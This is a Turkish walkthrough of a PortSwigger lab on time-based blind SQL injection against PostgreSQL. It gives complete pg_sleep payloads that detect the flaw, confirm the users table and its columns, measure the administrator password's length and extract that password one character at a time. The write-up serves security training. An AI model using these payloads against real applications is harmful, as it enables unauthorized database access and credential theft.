# Laboratuvar: Zaman gecikmeleri ve bilgi alma ile Blind SQL enjeksiyonu
Bu lab, **time delay Blind SQLi** açığını içermektedir.
Uygulama:

-   `TrackingId` adlı bir çerezi analiz amacıyla kullanır.
    
-   Bu çerezin değerini içeren bir SQL sorgusu çalıştırır.
    
-   Sorgu sonucu ekrana basılmaz.
    
-   SQL sorgusuna müdahale edilse bile çıktı değişmez.

Veritabanında:

-   `users` adlı tablo bulunur.
    
-   `username` ve `password` sütunları bulunur.
    

Amaç:  
`administrator` kullanıcısının parolasını bulup giriş yapmaktır.

Lab açılışı aşağıdaki gibi:
![BSQLi with time delays and information retrieval ilk](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20ilk.png?raw=true)

Öncelikle uygulamada bir zamana bağlı bind SQLi var mı ve hangi veri tabanı kullanılmakta bulunmalı. Bunları bulabilmek için zaman dayalı bir çok yük sayfanın cookie değerinde gönderilerek bulunmaya çalışılır. [Buradaki](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Generic_TimeBased.txt) yükleri deneyerek bu işlemler gerçekleşmiş olur. Bu lab için `'||(select 1 from pg_sleep(5))--` yükünü kullandığımızda sayfa 5 saniye sonra yüklenmekte. Bu bize sayfada zaman dayalı blind SQLi olduğunu ve veri tabanı olarak postgresql kullanıldığını göstermekte:
![BSQLi with time delays and information retrieval vdetect](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20vdetect.png?raw=true)

Veri tabanını bulduğumuza göre şimdi `users`  tablosunu doğrulamada. `'||(select case when (table_name = 'users') then pg_sleep(5) else pg_sleep(0) end from information_schema.tables where table_name = 'users')--` yükünü uyguladığımızda sayfanın 5 sani sonra yüklenir böylece `users` tablosunun varlığı doğrulanmış olur.
![BSQLi with time delays and information retrieval tdetect](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20tdetect.png?raw=true)
Sayfanın yüklenme süresi kırmızı kare içerisinde:
![BSQLi with time delays and information retrieval tdetect c](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20tdetect%20c.png?raw=true)

`users` tablosundan sonra bu tablodaki `usersname` ve `password` sütunlarının kontrolünü yapmalıyız.
`'||(select case when (column_name = 'username') then pg_sleep(5) else pg_sleep(0) end from information_schema.columns where table_name = 'users')--` ile `usersname` sütunu doğrulanmış olur.
![BSQLi with time delays and information retrieval ucdetect](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20ucdetect.png?raw=true)
Sayfanın yüklenme süresi kırmızı kare içerisinde:
![BSQLi with time delays and information retrieval ucdetect c](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20ucdetect%20c.png?raw=true)
`'||(select case when (column_name = 'password') then pg_sleep(7) else pg_sleep(0) end from information_schema.columns where table_name = 'users')--` ile `password` sütunu doğrulamış olur.
![BSQLi with time delays and information retrieval pcdetect](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20pcdetect.png?raw=true)
Sayfanın yüklenme süresi kırmızı kare içerisinde:
![BSQLi with time delays and information retrieval pcdetect c](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20pcdetect%20c.png?raw=true)

Son olarak `administrator` kullanıcısının parola uzunluğunun bulunmalı. `'||(select case when (LENGTH(password)>number) then pg_sleep(5) else pg_sleep(0) end from users where username = 'administrator' )--` yükündeki number kısmı değiştilerek parola uzunluğu bulunmaya çalışılır.
Örnek senaryo:
- Sorgu 1 (number -> 10) : Sayfa 5 saniye geç yüklendi parola 10 karakterden büyük.
- Sorgu 2 (number -> 19) : Sayfa 5 saniye geç yüklendi parola 19 karakterden büyük.
- Sorgu 4 (number -> 20) : Sayfa normal hızda yüklendi parola muhtemelen 20 karakter.
- Sorgu 5 (`>number` -> `= 20`) : Sayfa 5 saniye geç yüklendi parola 20 karakter.

![BSQLi with time delays and information retrieval plength](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20plength.png?raw=true)

Tüm bu bilgilerle artık parolayı bulabiliriz. `'||(select case when (SUBSTRING(password,{number},1)='{char}') then pg_sleep(5) else pg_sleep(0) end from users where username = 'administrator' )--` yükündeki `char` ve `number` kısmını değiştirerek parola bulunmaya çalışılır.
Örnek senaryo:
- Sorgu 1 (`char`->a, `number`->1) : Sayfa normal yüklendi 1. karakter a değil.
- Sorgu 2 (`char`->b, `number`->1) : Sayfa 5 saniye geç yüklendi 1. karakter a.
- Sorgu 3 (`char`->a, `number`->2) : Sayfa normal yüklendi 2. karakter a değil.
- Sorgu 4 (`char`->b, `number`->2) : Sayfa normal yüklendi 2. karakter b değil.
- Sorgu 5 (`char`->c, `number`->2) : Sayfa 5 saniye geç yüklendi 2. karakter c.
 - ..............

Bu yükü kullanan bir [kod](Parola%20kod) ile parola otomatik şekilde bulunabilir. Bu kod `number` ve `char` kısımlarına gerekli değerleri girecek ve sayfaya bir istek yollayacak eğer yanıt 5 saniyeden uzun sürerse yollamış olduğu `number` ve `char` değerlerini ekranda gösterecek.
![BSQLi with time delays and information retrieval pbulma](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20pbulma.png?raw=true)

Son olarak bulunan parola ile giriş işlemi gerçekleştirilerek lab çözülür:
![BSQLi with time delays and information retrieval cozum](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/images/BSQLi%20with%20time%20delays%20and%20information%20retrieval%20cozum.png?raw=true)

Aşağıdaki linkden labı kendiniz çözebilirsiniz.</br>
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
                                                

